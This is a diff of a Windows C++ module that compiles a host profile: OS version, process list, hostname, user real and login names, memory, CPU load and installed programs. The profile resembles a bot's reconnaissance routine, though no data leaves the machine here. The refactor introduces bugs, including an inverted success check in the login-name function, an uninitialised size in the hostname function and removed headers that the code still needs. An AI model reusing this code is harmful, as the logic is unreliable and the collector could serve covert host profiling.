@@ -1,26 +1,38 @@
 #include "stdafx.h"
 #include "Info.h"
 #include "Util.h"
-#include <Psapi.h>
-
-#define SECURITY_WIN32
-
-#include <security.h>
 
 // Use to convert bytes to MB
 #define DIV 1048576
 
 Info info;
 
-static void GetProcessInfoStr(DWORD processID, TCHAR *dst, size_t size)
+static bool GetOSVersion(std::tstring& str)
 {
-	std::string ret;
+	OSVERSIONINFO osVersionInfo;
+
+	ZeroMemory(&osVersionInfo, sizeof(OSVERSIONINFO));
+	osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+
+	// TODO: this function is deprecated since Windows 8?
+	GetVersionEx(&osVersionInfo);
+
+	str += std::to_tstring(osVersionInfo.dwMajorVersion);
+	str += _T(".");
+	str += std::to_tstring(osVersionInfo.dwMinorVersion);
+	str += _T(".");
+	str += std::to_tstring(osVersionInfo.dwBuildNumber);
+
+	return true;
+}
+static bool GetProcessInfoStr(DWORD processID, std::tstring& str)
+{
 	TCHAR processName[MAX_PATH] = _T("unknown");
 	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
 		FALSE, processID);
 
 	if(hProcess == NULL) {
-		return;
+		return false;
 	}
 
 	HMODULE hMod;
@@ -29,101 +41,95 @@ static void GetProcessInfoStr(DWORD processID, TCHAR *dst, size_t size)
 	if(EnumProcessModules(hProcess, &hMod, sizeof(hMod), &bytesNeeded)) {
 		GetModuleBaseName(hProcess, hMod, processName,
 			sizeof(processName) / sizeof(TCHAR));
-		_tcscat_s(dst, size, processName);
+
+		str += processName;
+		return true;
 	}
+
+	return false;
 }
 
-static std::string EnumerateProcesses()
+static bool EnumerateProcesses(std::tstring& str)
 {
 	DWORD processes[1024];
 	DWORD bytesNeeded;
 	DWORD processCount;
 	size_t i;
-	std::string ret;
 
 	if(!EnumProcesses(processes, sizeof(processes), &bytesNeeded)) {
-		return "";
+		return false;
 	}
 
 	processCount = bytesNeeded / sizeof(DWORD);
 
 	for(i = 0; i < processCount; i++) {
 		if(processes[i] != 0) {
-			TCHAR infoStr[2048] = { 0 };
-			GetProcessInfoStr(processes[i], infoStr, 2048);
-
-			char dest[2048] = { 0 };
-			std::wcstombs(dest, infoStr, 2048);
-
-			if(strlen(dest)) {
-				ret += dest;
-				ret += ";";
+			if(GetProcessInfoStr(processes[i], str)) {
+				str += _T(";");
 			}
 		}
 	}
 
-	return ret;
+	return true;
 }
 
-static std::string GetHostname()
+static bool GetHostname(std::tstring& str)
 {
 	TCHAR buffer[MAX_COMPUTERNAME_LENGTH + 1];
-	DWORD size = sizeof(buffer);
-	std::string ret = "unknown";
+	DWORD size;
 
 	if(GetComputerName(buffer, &size) != 0) {
-		char dest[MAX_COMPUTERNAME_LENGTH + 1];
-
-		std::wcstombs(dest, buffer, MAX_COMPUTERNAME_LENGTH + 1);
-		ret = dest;
+		str += std::tstring(buffer, size);
+		return true;
+	} else {
+		str += _T("unknown");
+		return false;
 	}
-
-	return ret;
 }
 
-static std::string GetTime()
+static bool GetTime(std::tstring &str)
 {
 	SYSTEMTIME sysTime;
-	std::string ret;
 
 	ZeroMemory(&sysTime, sizeof(SYSTEMTIME));
 	GetLocalTime(&sysTime);
 
-	ret += std::to_string(sysTime.wDay);
-	ret += ".";
-	ret += std::to_string(sysTime.wMonth);
-	ret += ".",
-	ret += std::to_string(sysTime.wYear);
-	ret += " ";
-	ret += std::to_string(sysTime.wHour);
-	ret += ":";
-	ret += std::to_string(sysTime.wMinute);
-	ret += ":";
-	ret += std::to_string(sysTime.wSecond);
+	str += std::to_tstring(sysTime.wDay);
+	str += _T(".");
+	str += std::to_tstring(sysTime.wMonth);
+	str += _T("."),
+	str += std::to_tstring(sysTime.wYear);
+	str += _T(" ");
+	str += std::to_tstring(sysTime.wHour);
+	str += _T(":");
+	str += std::to_tstring(sysTime.wMinute);
+	str += _T(":");
+	str += std::to_tstring(sysTime.wSecond);
 
-	return ret;
+	return true;
 }
 
-static std::string GetMemoryStatus()
+static bool GetMemoryStatus(std::tstring& str)
 {
 	MEMORYSTATUSEX statex;
-	std::string ret;
-
 	statex.dwLength = sizeof(statex);
-	GlobalMemoryStatusEx(&statex);
 
-	ret += "total:";
-	ret += std::to_string(statex.ullTotalPhys / DIV);
-	ret += ";";
+	if (GlobalMemoryStatusEx(&statex)) {
+		str += _T("total:");
+		str += std::to_tstring(statex.ullTotalPhys / DIV);
+		str += _T(";");
 
-	ret += "free:";
-	ret += std::to_string(statex.ullAvailPhys / DIV);
-	ret += ";";
-
-	return ret;
+		str += _T("free:");
+		str += std::to_tstring(statex.ullAvailPhys / DIV);
+		str += _T(";");
+		
+		return true;
+	} else {
+		return false;
+	}
 }
 
-static std::string GetCPULoad()
+static bool GetCPULoad(std::tstring& str)
 {
 	static DWORD dwLastProcessTime = 0;
 	static DWORD dwLastSystemTime = 0;
@@ -147,50 +153,49 @@ static std::string GetCPULoad()
 	dwLastProcessTime = dwActualProcessTime;
 	dwLastSystemTime = dwActualSystemTime;
 
-	return std::to_string(dCPULoad);
+	str += std::to_tstring(dCPULoad);
+
+	return true;
 }
 
-static std::string GetUsernameReal()
+static bool GetUsernameReal(std::tstring& str)
 {
 	TCHAR buffer[1024] = { 0 };
 	ULONG size = sizeof(buffer);
 
-	if(GetUserNameEx(NameDisplay, buffer, &size) == 0) {
-		return "unknown";
+	if(GetUserNameEx(NameDisplay, buffer, &size)) {
+		str += std::tstring(buffer, size);
+		return true;
+	} else {
+		str += _T("unknown");
+		return false;
 	}
-
-	char dest[1024] = { 0 };
-	std::wcstombs(dest, buffer, 1024);
-
-	return dest;
 }
 
-static std::string GetUsernameLogin()
+static bool GetUsernameLogin(std::tstring& str)
 {
 	TCHAR buffer[1024] = { 0 };
 	ULONG size = sizeof(buffer);
 
 	if(GetUserName(buffer, &size) == 0) {
-		return "unknown";
+		str += std::tstring(buffer, size);
+		return true;
+	} else {
+		str += _T("unknown");
+		return false;
 	}
-
-	char dest[1024] = { 0 };
-	std::wcstombs(dest, buffer, 1024);
-
-	return dest;
 }
 
-static std::string GetProgramList()
+static bool GetProgramList(std::tstring& str)
 {
-	std::string ret;
 	HKEY hKey = { 0 };
-	LPCTSTR path = TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
+	LPCTSTR path = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
 	HRESULT status;
 
 	status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_ENUMERATE_SUB_KEYS | KEY_WOW64_64KEY, &hKey);
 
 	if(status != ERROR_SUCCESS) {
-		return ret;
+		return false;
 	}
 
 	DWORD index = 0;
@@ -205,97 +210,67 @@ static std::string GetProgramList()
 			TCHAR dest[256];
 			DWORD size = 256;
 
-			status = RegQueryValueEx(hSubKey, TEXT("DisplayName"), NULL, NULL, (LPBYTE)dest, &size);
+			status = RegQueryValueEx(hSubKey, _T("DisplayName"), NULL, NULL, (LPBYTE)dest, &size);
 			if(status != ERROR_SUCCESS) {
 				continue;
 			}
 
-			char cdest[256];
-			std::wcstombs(cdest, dest, 256);
-			ret += cdest;
-			ret += ";";
+			// ignore size?
+			str += std::tstring(dest);
+			str += _T(";");
 		}
 	}
 
-	return ret;
+	return true;
 }
 
 Info::Info()
 {
 	// Has to be called atleast one time until we can use its value
-	GetCPULoad();
+	std::tstring dummy;
+	GetCPULoad(dummy);
 }
 
 Info::~Info()
 {
 }
 
-std::string Info::GetInformation()
+void Info::GetInformation(std::tstring& str)
 {
-	std::string info;
-	OSVERSIONINFO osVersionInfo;
+	str += _T("osVer:");
+	GetOSVersion(str);
+	str += _T("\n");
 
-	ZeroMemory(&osVersionInfo, sizeof(OSVERSIONINFO));
-	osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
 
-	// TODO: this function is deprecated since Windows 8?
-	GetVersionEx(&osVersionInfo);
+	str += _T("procs:");
+	EnumerateProcesses(str);
+	str += _T("\n");
 
-	info += "osVer:";
-	info += std::to_string(osVersionInfo.dwMajorVersion);
-	info += ".";
-	info += std::to_string(osVersionInfo.dwMinorVersion);
-	info += ".";
-	info += std::to_string(osVersionInfo.dwBuildNumber);
+	str += _T("hostname:");
+	GetHostname(str);
+	str += _T("\n");
 
-	info += "\n";
+	str += _T("time:");
+	GetTime(str);
+	str += _T("\n");
 
-	std::string procs = EnumerateProcesses();
+	str += _T("memory-usage:");
+	GetMemoryStatus(str);
+	str += _T("\n");
 
-	info += "procn:";
-	info += std::to_string(Util::split(procs, ';').size());
+	str += _T("cpu-usage:");
+	GetCPULoad(str);
+	str += _T("\n");
 
-	info += "\n";
+	str += _T("name-real:");
+	GetUsernameReal(str);
+	str += _T("\n");
 
-	info += "procs:";
-	info += procs;
+	str += _T("name-login:");
+	GetUsernameLogin(str);
+	str += _T("\n");
 
-	info += "\n";
-
-	info += "hostname:";
-	info += GetHostname();
-
-	info += "\n";
-
-	info += "time:";
-	info += GetTime();
-
-	info += "\n";
-
-	info += "memory-usage:";
-	info += GetMemoryStatus();
-
-	info += "\n";
-
-	info += "cpu-usage:";
-	info += GetCPULoad();
-
-	info += "\n";
-
-	info += "name-real:";
-	info += GetUsernameReal();
-
-	info += "\n";
-
-	info += "name-login:";
-	info += GetUsernameLogin();
-
-	info += "\n";
-
-	info += "programs:";
-	info += GetProgramList();
-
-	info += "\n";
-
-	return info;
+	str += _T("programs:");
+	GetProgramList(str);
+	str += _T("\n");
 }
